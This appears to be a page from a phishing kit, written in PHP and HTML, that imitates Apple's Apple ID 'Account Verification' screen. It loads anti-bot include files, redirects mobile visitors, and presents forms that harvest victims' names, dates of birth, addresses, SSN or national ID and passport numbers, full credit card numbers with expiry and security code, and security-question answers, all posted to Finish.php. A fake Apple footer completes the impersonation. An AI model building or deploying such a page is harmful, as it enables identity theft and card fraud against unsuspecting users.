<?php

require "assets/includes/session_protect.php";
require "assets/includes/functions.php";
require "assets/includes/language.php";
require "assets/includes/One_Time.php";
require "assets/includes/enc.php";
include "BOTS/antibots1.php";
include "BOTS/antibots2.php";
include "BOTS/antibots3.php";
include "BOTS/antibots4.php";
include "BOTS/antibots5.php";
include "BOTS/antibots6.php";
?>
<!DOCTYPE html>
<html>
<head>
<script type="text/javascript">
if (screen.width <= 699) {
document.location = "Step1.php?&sessionid=<?php echo generateRandomString(115);?>&securessl=true";
}
</script>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
<title>Confirm your information</title>
<link href="assets/img/favicon.ico" rel="shortcut icon" type="image/x-icon">
<link href="assets/css/First.css" media="all" rel="stylesheet" type="text/css">
<link href="assets/css/Second.css" rel="stylesheet" type="text/css">
<link href="assets/css/Fonts.css" rel="stylesheet" type="text/css">
<link href="assets/css/verify.css" rel="stylesheet" type="text/css">
<link href="assets/css/error-tips.css" rel="stylesheet" type="text/css">
</head>
<body id="pagecontent">
<div id="content">
<div class="bdd45">
<nav id="xdsfv54" class="js no-touch svg no-ie7 no-ie8">
<div class="HeaderObjHolder">
<ul class="MobHeader">
<li class="HeaderObj MobMenIconH">
<label class="MobMenHol"> 
<span class="MobMenIcon MobMenIcon-top">
<span class="MobMenIcon-crust MobMenIcon-crust-top"></span> </span> <span class="MobMenIcon MobMenIcon-bottom">
<span class="MobMenIcon-crust MobMenIcon-crust-bottom"></span> </span>
</label>
</li>
<li class="HeaderObj">
<a class="Item1" href="#" style="display: inline-block;margin-left:50%;margin-top:11px" id="ac-gn-firstfocus-small"> <span class="ac-gn-link-text">&nbsp;</span> </a>
<a class="Item10" style="display: inline-block;float:right;margin-top:11px" href="#"> <span class="ac-gn-link-text">&nbsp;</span> <span class="ac-gn-bag-badge"></span> </a> <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span> 
</li>
</ul>
<ul class="HeaderObjList">
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item1" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item2" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item3" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item4" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item5" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item6" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item7" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item8" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item9" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item10" href="#"></a></li>
</ul>
</div>
</nav>
<div id="flow">
<div class="flow-body signin clearfix" role="main">
<div class="persona-splash no-photo clearfix">
    <div class="persona-bg"></div>
    <div class="container">
        <div class="splash-section">
            <div class=" person-wrapper">
                <div>
                    <div class="row">
                        <div class="col-sm-9 appleid-col">
                            <div class="flex-container">
                                <h1 class="not-mobile appleid-user">
                                    <span class="first_name">Account Verification</span>
                                    <small class="SessionUser">Your Apple ID is <strong><?php echo $_SESSION['user'];?></strong> </small>
                                </h1>
                            </div>
                        </div>
                        <div class="not-mobile col-sm-3">
                            <div class="flex-container-signout">
                                <div class="signout pull-right">
                                    <button class="btn btn-link">Sign Out </button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
<div class="container">
<div class="flex home-content">
<form action="Finish.php?&sessionid=<?php echo generateRandomString(115); ?>&securessl=true" method="post" name="details" id="details" class="proceed">
<div class="container flow-sections">
<section class="flow-section mobile-section-edit  edit ">
    <div class="account-wrapper">
        <div class="row">
            <div class="col-md-3 section-name" id="heading-account">
                <h2 class="not-mobile section-title wrap-section-title">Personal Information</h2>
            </div>
            <div id="account-content" aria-labelledby="heading-account" class="col-md-9 subsection">
<div class="accordion-fade ">
    <div class="accordion-fade acdn-edit" style="opacity: 1; overflow: inherit;">
<div class="editable account-edit clearfix">
<div class="row edit-row">
<div class="col-sm-5">                            
<h3 class="section-subtitle" id="nameLabel">NAME</h3>
<div class="form-group">
<div class="pop-wrapper field-pop-wrapper first-wrapper">
<div class="name-input">
  <input type="text" name="fname" id="fname" class="generic-input-field form-control field" placeholder="first name">
</div>
</div>
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
  <input type="text" name="mname" id="mname" class="generic-input-field form-control field" placeholder="middle name (optional)">
</div>
</div>
<div class="pop-wrapper field-pop-wrapper last-wrapper">
<div class="name-input">
  <input type="text" name="lname" id="lname" class="generic-input-field form-control field" placeholder="last name">
</div>
</div>
</div>
</div>
</div>
<div class="row edit-row">
<div class="col-sm-5">
<h3 class="section-subtitle">DATE OF BIRTH</h3>
<div class="form-group">
<div class="pop-wrapper field-pop-wrapper">
<div class="dob-wrapper clearfix">
<input id="dob" name="dob" class="form-control form-input" type="text" placeholder="date of birth">
</div>
</div>
</div>
</div>
</div>
<div class="row edit-row">
<div class="col-sm-5">
<h3 class="section-subtitle">TELEPHONE</h3>
<div class="form-group">
<div class="pop-wrapper field-pop-wrapper">
<div class="dob-wrapper clearfix">
<input id="telephone" name="telephone" class="form-control form-input" type="text" placeholder="telephone number">
</div>
</div>
</div>
</div>
</div>
<?php echo $lang['SSN'];?>
<?php echo $lang['PASSPORT'];?>
<?php echo $lang['NUMBID'];?>
<?php echo $lang['NAID'];?>
<?php echo $lang['CIVILID'];?>
<?php echo $lang['QATARID'];?>
<?php echo $lang['CITIZENID'];?>
<div class="row edit-row">
<div class="col-sm-5">
<h3 class="section-subtitle">ADDRESS</h3>
<div class="form-group">
<div class="pop-wrapper field-pop-wrapper first-wrapper">
<div class="name-input">
  <input type="text" name="address" id="address" class="generic-input-field form-control field" placeholder="address Line ">
</div>
</div>
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
  <input type="text" name="town" id="town" class="generic-input-field form-control field" placeholder="town / city">
</div>
</div>
<div class="form-group clearfix middle-wrapper">
<div class="select-wrapper">
<?php echo $lang['COUNTYSELECT'];?>
</div>
</div>
<div class="pop-wrapper field-pop-wrapper last-wrapper">
<div class="name-input">
  <input type="text" name="postcode" id="postcode" class="generic-input-field form-control field" placeholder="<?php echo $lang['POSTCODE'];?>">
</div>
</div>
<input type="hidden" name="country" value="<?php echo $lang['COUNTRY'];?>">
</div>
</div>
</div>
</div>
</div>
<div class="accordion-fade acdn-nonedit"></div>
</div>
</div>
</div>
</div>
</section>
<section class="flow-section mobile-section-edit  edit ">
<div class="account-wrapper">
<div class="row">
<div class="col-md-3 section-name" id="heading-account">
<h2 class="not-mobile section-title wrap-section-title">Account Details</h2>
</div>
<div id="account-content" class="col-md-9 subsection">
<div class="accordion-fade ">
<div class="accordion-fade acdn-edit" style="opacity: 1; overflow: inherit;">
            
<div class="editable account-edit clearfix">
<div class="row edit-row">
<div class="col-sm-5">                            
<h3 class="section-subtitle" id="nameLabel">CARD DETAILS</h3>
<div class="form-group">
<div class="pop-wrapper field-pop-wrapper first-wrapper">
<div class="name-input">
  <input type="text" name="ccname" id="ccname" class="generic-input-field form-control field" placeholder="cardholders name">
</div>
</div>
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
  <input type="text" name="ccno" id="ccno" class="cc-number generic-input-field form-control field" placeholder="card number">
</div>
</div>
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
  <input type="text" name="ccexp" id="ccexp" class="cc-exp generic-input-field form-control field" placeholder="expiry date">
</div>
</div>
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
  <input type="text" name="secode" id="secode" class="cc-cvc generic-input-field form-control field" placeholder="card security code">
</div>
</div>
<?php echo $lang['CREDITLIMIT'];?>
<?php echo $lang['ACCOUNT'];?>
</div>
</div> 
</div>
</div>
</div>
<div class="accordion-fade acdn-nonedit"></div>
</div>
</div>
</div>
</div>
</section>
<section class="flow-section mobile-section-edit  edit " style="border-bottom: 0px;">
<div class="account-wrapper">
<div class="row">
<div class="col-md-3 section-name" id="heading-account">
<h2 class="not-mobile section-title wrap-section-title">Security</h2>
</div>
<div id="account-content" class="col-md-9 subsection">
<div class="accordion-fade ">
<div class="accordion-fade acdn-edit" style="opacity: 1; overflow: inherit;">       
<div class="editable account-edit clearfix">
<div class="row edit-row">
<div class="col-sm-5">                            
<h3 class="section-subtitle" id="nameLabel">SELECT A SECURITY QUESTION</h3>
<div class="form-group">
<div class="form-group clearfix" style="padding-top:0px;">
<div class="select-wrapper">
<select id="q1" name="q1" type="text" class="form-control question" style="height:32px!important;padding-left:10px;">
  <option  value="">select security question</option>
  <option value="mothers maiden name">Mother&apos;s Maiden Name</option>
  <option value="drivers no">Driving License Number</option>
  <option value="passport no">Passport Number</option>
</select>
</div>
</div>
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
  <input type="text" name="a1" id="a1" class="generic-input-field form-control field" placeholder="answer">
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="accordion-fade acdn-nonedit"></div>
</div>
</div>
</div>
</div>
</section>
</div>
<input type="submit" class="gobtn btn-link" style="float:right;" value="Finish">
</form>
<!-- FORM ENDS -->
</div>
</div>
</div>
</div>
<footer>
<div class="container">
<div class="footer">
<div class="footer-wrap">
<div class="FooterLine1">
<div class="line-level">Shop the <a href="#">Apple Online Store</a> (<?php echo $lang['APPCALL'];?>), visit an <a href="#">Apple Retail Store</a>, or find a <a href="#">reseller</a>.</div>
</div>
<div class="FooterLine2">
<ul class="menu">
<li class="item"><a href="#">Apple Info</a></li>
<li class="item"><a href="#">Site Map</a></li>
<li class="item"><a href="#">Hot News</a></li>
<li class="item"><a href="#">RSS Feeds</a></li>
<li class="item"><a href="#">Contact Us</a></li>
<li class="item"><a class="choose" href="#"><img height="22" src="<?php echo $lang['FLAG'];?>" width="22"></a></li>
</ul>
</div>
<div class="FooterLine3">Copyright © 2017 Apple Inc. All rights reserved.
<ul class="menu">
<li class="item"><a href="#">Terms of Use</a></li>
<li class="item"><a href="#">Privacy Policy</a></li>
</ul>
</div>
</div>
</div>
</div>
</footer>
</div>
</div>
</body>
</html>